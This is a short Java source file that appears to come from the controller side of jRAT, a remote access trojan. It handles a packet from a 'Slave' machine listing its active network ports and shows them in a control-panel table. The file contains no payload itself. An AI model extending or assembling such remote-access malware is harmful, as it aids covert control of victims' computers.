package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlActivePorts;


public class Packet51ActivePort extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String prot = slave.readLine();
		String la = slave.readLine();
		String status = slave.readLine();
		String ext = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);

		if (frame != null) {
			PanelControlActivePorts panel = (PanelControlActivePorts) frame.panels.get("active ports");
			panel.getModel().addRow(new Object[] { prot, la, ext, status });
		}

	}

}
